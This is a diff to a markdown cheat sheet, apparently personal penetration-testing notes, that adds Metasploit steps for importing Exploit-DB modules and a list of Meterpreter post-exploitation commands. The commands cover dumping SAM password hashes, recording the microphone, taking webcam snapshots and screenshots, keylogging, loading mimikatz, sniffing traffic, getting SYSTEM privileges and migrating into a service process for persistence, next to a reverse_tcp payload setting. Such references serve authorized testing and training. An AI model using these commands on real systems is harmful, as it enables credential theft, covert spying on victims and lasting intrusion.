@@ -30,12 +30,46 @@ search platform:exploit description:samsung
 - Change default payload
   - ```show payloads``` 
   - ```set payload windows/meterpreter/reverse_tcp```
-- Change targets
+- Change target
   - ```show targets```
   - ```set target 1```
+- Add new exploit
+  - Download exploit from *"exploit-db"* that contains *"This module requires metasploit"* in text & ```Class MetasploitModule``` in code
+  - Add file to ```/root/.msf4/local```
+  - Restart OS & Postgresql
 
 ## Meterprete
-
+- Common
+  - ```pwd``` & ```lpwd```
+  - ```ls``` & ```lls```
+  - ```download h.txt```
+  - ```upload```
+- Show SAM file
+  - ```hashdump```
+- Spy
+  - ```record_mic -d 60```
+  - ```webcam_snap```
+  - ```screenshot```
+  - ```arp```
+  - ```netstat```
+  - ```keyscan_start``` & ```keyscan_dump``` & ```keyscan_stop```
+  - ```getuid```
+- Mimikatz
+  - ```load mimikatz```
+  - ```help```
+- Pcap
+  - ```load sniffer```
+  - ```help```
+  - ```sniffer interfaces```
+  - ```sniffer_start z packet_buffer 40```
+  - ```sniffer_dump z test.pcap```
+  - ```sniffer_stop```
+- PE
+  - ```getsystem```
+- Process & Migrate
+  - ```ps```
+  - ```migrate 596```
+    - 596 is PID of service.exe - DLL Hijack for persistant
 
 Input from nmap
 - ```nmap -sV -oX output.xml 192.168.3.5```
